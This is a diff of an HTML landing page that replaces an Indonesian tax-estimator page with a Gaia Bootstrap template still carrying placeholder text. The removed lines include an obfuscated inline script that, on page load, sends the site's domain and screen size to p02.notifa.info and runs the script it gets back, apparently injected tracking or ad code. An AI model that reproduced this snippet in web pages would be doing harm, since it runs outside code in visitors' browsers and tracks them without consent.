@@ -1,252 +1,403 @@
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="en">
 
-
-<!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:53:46 GMT -->
 <head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
-    <title>Tax Generator</title>
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="css/bootstrap.min.css">
-    <link rel="stylesheet" href="vendors/bootstrap-selector/css/bootstrap-select.min.css">
-    <!--icon font css-->
-    <link rel="stylesheet" href="vendors/themify-icon/themify-icons.css">
-    <link rel="stylesheet" href="vendors/flaticon/flaticon.css">
-    <link rel="stylesheet" href="vendors/animation/animate.css">
-    <link rel="stylesheet" href="vendors/owl-carousel/assets/owl.carousel.min.css">
-    <link rel="stylesheet" href="vendors/magnify-pop/magnific-popup.css">
-    <link rel="stylesheet" href="vendors/nice-select/nice-select.css">
-    <link rel="stylesheet" href="vendors/elagent/style.css">
-    <link rel="stylesheet" href="vendors/scroll/jquery.mCustomScrollbar.min.css">
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="stylesheet" href="css/responsive.css">
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
+	<link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon.png">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>Count Yours</title>
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+    <link href="assets/css/bootstrap.css" rel="stylesheet" />
+    <link href="assets/css/gaia.css" rel="stylesheet"/>
+
+    <!--     Fonts and icons     -->
+    <link href='https://fonts.googleapis.com/css?family=Cambo|Poppins:400,600' rel='stylesheet' type='text/css'>
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
+    <link href="assets/css/fonts/pe-icon-7-stroke.css" rel="stylesheet">
 </head>
 
 <body>
-    <div class="body_wrapper">
-        <header class="header_area">
-            <nav class="navbar navbar-expand-lg menu_one menu_four">
-                <div class="container">
-                    <a class="navbar-brand sticky_logo" href="/home"><img src="img/logotax.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/logotax2.png" srcset="img/logo2x.png 2x" alt=""></a>
-                    <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-                        <span class="menu_toggle">
-                            <span class="hamburger">
-                                <span></span>
-                                <span></span>
-                                <span></span>
-                            </span>
-                            <span class="hamburger-cross">
-                                <span></span>
-                                <span></span>
-                            </span>
-                        </span>
-                    </button>
 
-                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-                        <ul class="navbar-nav menu w_menu ml-auto">
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
+    <nav class="navbar navbar-default navbar-transparent navbar-fixed-top" color-on-scroll="200">
+        <!-- if you want to keep the navbar hidden you can add this class to the navbar "navbar-burger"-->
+        <div class="container">
+            <div class="navbar-header">
+                <button id="menu-toggle" type="button" class="navbar-toggle" data-toggle="collapse" data-target="#example">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar bar1"></span>
+                    <span class="icon-bar bar2"></span>
+                    <span class="icon-bar bar3"></span>
+                </button>
+                <a href="http://www.creative-tim.com" class="navbar-brand">
+                    CountYours
+                </a>
+            </div>
+            <div class="collapse navbar-collapse">
+                <ul class="nav navbar-nav navbar-right navbar-uppercase">
+        
+                    <li class="dropdown">
+                        <a href="#gaia" class="dropdown-toggle" data-toggle="dropdown">
+                            <i class="fa fa-share-alt"></i> Share
+                        </a>
+                        <ul class="dropdown-menu dropdown-danger">
+                            <li>
+                                <a href="#"><i class="fa fa-facebook-square"></i> Facebook</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
+                            <li>
+                                <a href="#"><i class="fa fa-twitter"></i> Twitter</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
-                            </li>
+                            <li>
+                                <a href="#"><i class="fa fa-instagram"></i> Instagram</a>
                             </li>
                         </ul>
-                    </div>
-                    <a class="btn_get btn_hover hidden-sm hidden-xs" href="/login">Login</a>
-                    <a class="btn_get btn_hover hidden-sm hidden-xs" href="/register">Register</a>
-                </div>
-            </nav>
-        </header>
-        <section class="payment_banner_area_two">
+                    </li>
+                    <li>
+                        <a href="/login" class="btn btn-danger btn-fill">Hitung</a>
+                    </li>
+                    
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+    </nav>
+
+
+    <div class="section section-header">
+        <div class="parallax filter filter-color-red">
+            <div class="image"
+                style="background-image: url('assets/img/header-1.jpeg')">
+            </div>
             <div class="container">
-                <div class="payment_content_two text-center">
-                    <h2>The next generation <br>of <span>Tax Generator</span></h2>
-                    <div class="action_btn d-flex align-items-center justify-content-center">
-                        <a href="/register" class="slider_btn btn_hover"><i class="ti-plus"></i>Join Us</a>
-                        <a href="/register" class="video_btn">Silahkan Daftar & Login<br>untuk menggunakan tools Gratis dari kami</a>
+                <div class="content">
+                    <div class="title-area">
+                        <p>Login</p>
+                        <h1 class="title-modern">CountYours</h1>
+                        <h3>Probably the most stylish bootstrap template in the world!</h2>
+                        <div class="separator line-separator">♦</div>
                     </div>
-                    <div class="payment_img">
-                        <img src="img/new/ch2.png" alt="">
-                        <div></div>
-                        <img class="payment_icon icon_one" src="img/new/01.png" alt="">
-                        <img class="payment_icon icon_two" src="img/new/02.png" alt="">
-                        <img class="payment_icon icon_three" src="img/new/03.png" alt="">
-                        <img class="payment_icon icon_four" src="img/new/04.png" alt="">
-                        <img class="payment_icon icon_five" src="img/new/05.png" alt="">
-                        <img class="payment_icon icon_six" src="img/new/06.png" alt="">
+
+                    <div class="button-get-started">
+                        <a href="http://www.creative-tim.com/product/gaia-bootstrap-template" target="_blank" class="btn btn-white btn-fill btn-lg ">
+                            Download Demo
+                        </a>
                     </div>
                 </div>
-                <div class="symbols-pulse active">
-                    <div class="pulse-1"></div>
-                    <div class="pulse-2"></div>
-                    <div class="pulse-3"></div>
-                    <div class="pulse-4"></div>
-                    <div class="pulse-x"></div>
-                </div>
+
             </div>
-        </section>
-        <section class="payment_features_two sec_pad">
-            <div class="container">
-                <div class="sec_title text-center mb_70 wow fadeInUp" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
-                    <h2 class="f_p f_size_30 l_height50 f_700 t_color">TAX GENERATOR</h2>
-                    <p class="f_400 f_size_18 l_height34">Adalah sebuat tools gratis yang bisa kamu gunakan<br>untuk membantu kamu dalam hal memprediksi Jumlah Pajak Yang Harus kamu Bayarkan</p>
-                    <img src="img/ch3.png">
-                </div>
-                <div class="row">
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="payment_features_item text-center">
-                            <img src="img/new/icon8.png" alt="">
-                            <h4>Tax Generator</h4>
-                            <p>Website kami mampu untuk membuat perkiraan jumlah pajak yang harus anda bayarkan berdasarkan data yang anda input.<br><br></p>
-                        </div>
-                    </div>
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="payment_features_item text-center">
-                            <img src="img/new/icon7.png" alt="">
-                            <h4>Responsive</h4>
-                            <p>Tax Generator merupakan website yang bisa digunakan semua perangkat yang anda miliki, karena website ini sangat responsive.</p>
-                        </div>
-                    </div>
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="payment_features_item text-center">
-                            <img src="img/new/icon1.png" alt="">
-                            <h4>User Friendly</h4>
-                            <p>Memiliki fitur yang sangat mudah untuk digunakan dan tidak membingungkan.<br><br><br><br></p>
-                        </div>
-                    </div>
-                    <div class="col-lg-3 col-sm-6">
-                        <div class="payment_features_item text-center">
-                            <img src="img/new/icon9.png" alt="">
-                            <h4>Modern Design</h4>
-                            <p>Tampilan website yang elegan akan membuat anda nyaman menggunakan layanan dari kami<br><br><br></p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-        <section class="payment_features_area_three bg_color">
-            <div class="container">
-                <div class="row">
-                    <div class="col-lg-7 d-flex align-items-center">
-                        <div class="payment_features_content_two">
-                            <h2 class="t_color">Tax Generator</h2>
-                            <p>Pengguna dapat menentukan besaran pajak yang harus ia bayarkan. Dalam laman aplikasi, pengguna memilih beberapa pilihan sebelum memasukan data yang mana sesuai dengan kondisi pengguna. Data yang diminta berupa data finansial pribadi yang tak akan digunakan untuk keperluan lain. Data akan diproses dengan perhitungan yang transparan dan akan menampilkan hasil berupa estimasi dana pajak yang harus ia bayarkan.</p>
-                            <div class="row">
-                                <div class="col-lg-6 col-md-6">
-                                    <div class="item">
-                                        <img src="img/new/icon/icon1.png" alt="">
-                                        <h3>Ayo registrasi</h3>
-                                        <p>Untuk dapat menggunakan tools gratis dari kami, pengguna diharuskan untuk mendaftar dan login terlebih dahulu</p>
-                                    </div>
-                                </div>
-                                <div class="col-lg-6 col-md-6">
-                                    <div class="item">
-                                        <img src="img/new/icon/icon2.png" alt="">
-                                        <h3>Simple Setup</h3>
-                                        <p>Hanya dengan beberapa langkah kamu bisa menghitung pajak kamu dengan mudah</p>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-lg-5">
-                        <img class="img-fluid" src="img/new/ch6.png" alt="">
-                    </div>
-                </div>
-            </div>
-        </section>
-        <section class="payment_priceing_area">
-            <div class="container">
-                <div class="sec_title mb_70 wow fadeInUp text-center" data-wow-delay="0.4s">
-                    <h2 class="f_p f_size_30 l_height40 f_700 t_color">Tools Gratis, <br>Tidak Dipungut Biaya</h2>
-                    <p class="f_400 f_size_18 l_height34">Gunakan tools ini secara gratis tanpa harus membayar sepeserpun uang<br> Ini benar-benar gratis!</p>
-                </div>
-            </div>
-        </section>
-        <section class="payment_subscribe_area">
-            <div class="container">
-                <div class="payment_subscribe_info">
-                    <div class="payment_subscribe_content">
-                        <h2>Ingin berlangganan?</h2>
-                        <p>Berlangganan info terbaru secara gratis <br>hanya menggunakan email.</p>
-                    </div>
-                    <form action="#" class="subscribe-form">
-                        <input type="text" class="form-control" placeholder="Email address">
-                        <button type="submit" class="btn_hover btn_four">Berlangganan</button>
-                    </form>
-                </div>
-            </div>
-        </section>
-        <footer class="payment_footer_area">
-            <div class="footer_top_six">
-                <div class="container">
-                    <div class="row">
-                        <div class="col-lg-4 col-sm-6">
-                            <div class="f_widget company_widget">
-                                <a href="/home" class="f-logo"><img src="img/bigtaxlogo.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
-                                <p class="mt_40">Tax Generator adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br><h6 style="color:white;">Copyright © 2020 TaxGenerator.com</h6></p>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-sm-6">
-                            <div class="f_widget about-widget">
-                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Page</h3>
-                                <ul class="list-unstyled f_list">
-                                    <li><a href="/aboutus">About Us</a></li>
-                                    <li><a href="/disclaimer">Disclaimer</a></li>
-                                    <li><a href="/privacy">Privacy Policy</a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div class="col-lg-3 col-sm-6">
-                            <div class="f_widget about-widget">
-                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Developer</h3>
-                                <ul class="list-unstyled f_list">
-                                    <li><a href="#">Faris Izzatur Rahman</a></li>
-                                    <li><a href="#">Hafad Furqani</a></li>
-                                    <li><a href="#">M. Rizki Riswandi</a></li>
-                                    <li><a href="#">Rico Halim</a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div class="col-lg-2 col-sm-6">
-                            <div class="f_widget social-widget">
-                                <h3 class="f-title f_600 w_color f_size_18 mb_40">Follow Us</h3>
-                                <div class="f_social_icon">
-                                    <a href="#" class="ti-facebook"></a>
-                                    <a href="#" class="ti-twitter-alt"></a>
-                                    <a href="#" class="ti-vimeo-alt"></a>
-                                    <a href="#" class="ti-pinterest"></a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </footer>
+        </div>
     </div>
 
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="js/jquery-3.2.1.min.js"></script>
-    <script src="js/propper.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="vendors/wow/wow.min.js"></script>
-    <script src="vendors/sckroller/jquery.parallax-scroll.js"></script>
-    <script src="vendors/owl-carousel/owl.carousel.min.js"></script>
-    <script src="vendors/imagesloaded/imagesloaded.pkgd.min.js"></script>
-    <script src="vendors/isotope/isotope-min.js"></script>
-    <script src="vendors/magnify-pop/jquery.magnific-popup.min.js"></script>
-    <script src="vendors/bootstrap-selector/js/bootstrap-select.min.js"></script>
-    <script src="vendors/nice-select/jquery.nice-select.min.js"></script>
-    <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
-    <script src="js/plugins.js"></script>
-    <script src="js/main.js"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+    <div class="section">
+        <div class="container">
+            <div class="row">
+                <div class="title-area">
+                    <h2>Our Services</h2>
+                    <div class="separator separator-danger">✻</div>
+                    <p class="description">We promise you a new look and more importantly, a new attitude. We build that by getting to know you, your needs and creating the best looking clothes.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="info-icon">
+                        <div class="icon text-danger">
+                            <i class="pe-7s-graph1"></i>
+                        </div>
+                        <h3>Sales</h3>
+                        <p class="description">We make our design perfect for you. Our adjustment turn our clothes into your clothes.</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="info-icon">
+                        <div class="icon text-danger">
+                            <i class="pe-7s-note2"></i>
+                        </div>
+                        <h3>Content</h3>
+                        <p class="description">We create a persona regarding the multiple wardrobe accessories that we provide..</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="info-icon">
+                        <div class="icon text-danger">
+                            <i class="pe-7s-music"></i>
+                        </div>
+                        <h3>Music</h3>
+                        <p class="description">We like to present the world with our work, so we make sure we spread the word regarding our clothes.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
 
-<!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:54:12 GMT -->
+    <div class="section section-our-team-freebie">
+        <div class="parallax filter filter-color-black">
+            <div class="image" style="background-image:url('assets/img/header-2.jpeg')">
+            </div>
+            <div class="container">
+                <div class="content">
+                    <div class="row">
+                        <div class="title-area">
+                            <h2>Who We Are</h2>
+                            <div class="separator separator-danger">✻</div>
+                            <p class="description">We promise you a new look and more importantly, a new attitude. We build that by getting to know you, your needs and creating the best looking clothes.</p>
+                        </div>
+                    </div>
+
+                    <div class="team">
+                        <div class="row">
+                            <div class="col-md-10 col-md-offset-1">
+                                <div class="row">
+                                    <div class="col-md-4">
+                                        <div class="card card-member">
+                                            <div class="content">
+                                                <div class="avatar avatar-danger">
+                                                    <img alt="..." class="img-circle" src="assets/img/faces/face_1.jpg"/>
+                                                </div>
+                                                <div class="description">
+                                                    <h3 class="title">Tina</h3>
+                                                    <p class="small-text">CEO / Co-Founder</p>
+                                                    <p class="description">I miss the old Kanye I gotta say at that time I’d like to meet Kanye And I promise the power is in the people and I will use the power given by the people to bring everything I have back to the people.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <div class="card card-member">
+                                            <div class="content">
+                                                <div class="avatar avatar-danger">
+                                                    <img alt="..." class="img-circle" src="assets/img/faces/face_4.jpg"/>
+                                                </div>
+                                                <div class="description">
+                                                    <h3 class="title">Andrew</h3>
+                                                    <p class="small-text">Product Designer</p>
+                                                    <p class="description">I miss the old Kanye I gotta say at that time I’d like to meet Kanye And I promise the power is in the people and I will use the power given by the people to bring everything I have back to the people.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <div class="card card-member">
+                                            <div class="content">
+                                                <div class="avatar avatar-danger">
+                                                    <img alt="..." class="img-circle" src="assets/img/faces/face_3.jpg"/>
+                                                </div>
+                                                <div class="description">
+                                                    <h3 class="title">Michelle</h3>
+                                                    <p class="small-text">Marketing Hacker</p>
+                                                    <p class="description">I miss the old Kanye I gotta say at that time I’d like to meet Kanye And I promise the power is in the people and I will use the power given by the people to bring everything I have back to the people.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="section section-our-clients-freebie">
+        <div class="container">
+            <div class="title-area">
+                <h5 class="subtitle text-gray">Here are some</h5>
+                <h2>Clients Testimonials</h2>
+                <div class="separator separator-danger">∎</div>
+            </div>
+
+            <ul class="nav nav-text" role="tablist">
+                <li class="active">
+                    <a href="#testimonial1" role="tab" data-toggle="tab">
+                        <div class="image-clients">
+                            <img alt="..." class="img-circle" src="assets/img/faces/face_5.jpg"/>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="#testimonial2" role="tab" data-toggle="tab">
+                        <div class="image-clients">
+                            <img alt="..." class="img-circle" src="assets/img/faces/face_6.jpg"/>
+                        </div>
+                    </a>
+                </li>
+                <li>
+                    <a href="#testimonial3" role="tab" data-toggle="tab">
+                        <div class="image-clients">
+                            <img alt="..." class="img-circle" src="assets/img/faces/face_2.jpg"/>
+                        </div>
+                    </a>
+                </li>
+            </ul>
+
+
+            <div class="tab-content">
+                <div class="tab-pane active" id="testimonial1">
+                    <p class="description">
+                        And I used a period because contrary to popular belief I strongly dislike exclamation points! We no longer have to be scared of the truth feels good to be home In Roman times the artist would contemplate proportions and colors. Now there is only one important color... Green I even had the pink polo I thought I was Kanye I promise I will never let the people down. I want a better life for all!
+                    </p>
+                </div>
+                <div class="tab-pane" id="testimonial2">
+                    <p class="description">Green I even had the pink polo I thought I was Kanye I promise I will never let the people down. I want a better life for all! And I used a period because contrary to popular belief I strongly dislike exclamation points! We no longer have to be scared of the truth feels good to be home In Roman times the artist would contemplate proportions and colors. Now there is only one important color...
+                    </p>
+                </div>
+                <div class="tab-pane" id="testimonial3">
+                    <p class="description"> I used a period because contrary to popular belief I strongly dislike exclamation points! We no longer have to be scared of the truth feels good to be home In Roman times the artist would contemplate proportions and colors. The 'Gaia' team did a great work while we were collaborating. They provided a vision that was in deep connection with our needs and helped us achieve our goals.
+                    </p>
+                </div>
+
+            </div>
+
+        </div>
+    </div>
+
+
+    <div class="section section-small section-get-started">
+        <div class="parallax filter">
+            <div class="image"
+                style="background-image: url('assets/img/office-1.jpeg')">
+            </div>
+            <div class="container">
+                <div class="title-area">
+                    <h2 class="text-white">Do you want to work with us?</h2>
+                    <div class="separator line-separator">♦</div>
+                    <p class="description"> We are keen on creating a second skin for anyone with a sense of style! We design our clothes having our customers in mind and we never disappoint!</p>
+                </div>
+
+                <div class="button-get-started">
+                    <a href="#gaia" class="btn btn-danger btn-fill btn-lg">Contact Us</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <footer class="footer footer-big footer-color-black" data-color="black">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-2 col-sm-3">
+                    <div class="info">
+                        <h5 class="title">Company</h5>
+                        <nav>
+                            <ul>
+                                <li>
+                                    <a href="#">Home</a></li>
+                                <li>
+                                    <a href="#">Find offers</a>
+                                </li>
+                                <li>
+                                    <a href="#">Discover Projects</a>
+                                </li>
+                                <li>
+                                    <a href="#">Our Portfolio</a>
+                                </li>
+                                <li>
+                                    <a href="#">About Us</a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+                <div class="col-md-3 col-md-offset-1 col-sm-3">
+                    <div class="info">
+                        <h5 class="title"> Help and Support</h5>
+                         <nav>
+                            <ul>
+                                <li>
+                                    <a href="#">Contact Us</a>
+                                </li>
+                                <li>
+                                    <a href="#">How it works</a>
+                                </li>
+                                <li>
+                                    <a href="#">Terms &amp; Conditions</a>
+                                </li>
+                                <li>
+                                    <a href="#">Company Policy</a>
+                                </li>
+                                <li>
+                                    <a href="#">Money Back</a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+                <div class="col-md-3 col-sm-3">
+                    <div class="info">
+                        <h5 class="title">Latest News</h5>
+                        <nav>
+                            <ul>
+                                <li>
+                                    <a href="#">
+                                        <i class="fa fa-twitter"></i> <b>Get Shit Done</b> The best kit in the market is here, just give it a try and let us...
+                                        <hr class="hr-small">
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#">
+                                        <i class="fa fa-twitter"></i> We've just been featured on <b> Awwwards Website</b>! Thank you everybody for...
+                                    </a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+                <div class="col-md-2 col-md-offset-1 col-sm-3">
+                    <div class="info">
+                        <h5 class="title">Follow us on</h5>
+                        <nav>
+                            <ul>
+                                <li>
+                                    <a href="#" class="btn btn-social btn-facebook btn-simple">
+                                        <i class="fa fa-facebook-square"></i> Facebook
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#" class="btn btn-social btn-dribbble btn-simple">
+                                        <i class="fa fa-dribbble"></i> Dribbble
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#" class="btn btn-social btn-twitter btn-simple">
+                                        <i class="fa fa-twitter"></i> Twitter
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#" class="btn btn-social btn-reddit btn-simple">
+                                        <i class="fa fa-google-plus-square"></i> Google+
+                                    </a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <hr>
+            <div class="copyright">
+                 © <script> document.write(new Date().getFullYear()) </script> Creative Tim, made with love
+            </div>
+        </div>
+    </footer>
+
+</body>
+
+<!--   core js files    -->
+<script src="assets/js/jquery.min.js" type="text/javascript"></script>
+<script src="assets/js/bootstrap.js" type="text/javascript"></script>
+
+<!--  js library for devices recognition -->
+<script type="text/javascript" src="assets/js/modernizr.js"></script>
+
+<!--  script for google maps   -->
+<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js"></script>
+
+<!--   file where we handle all the script from the Gaia - Bootstrap Template   -->
+<script type="text/javascript" src="assets/js/gaia.js"></script>
+
 </html>
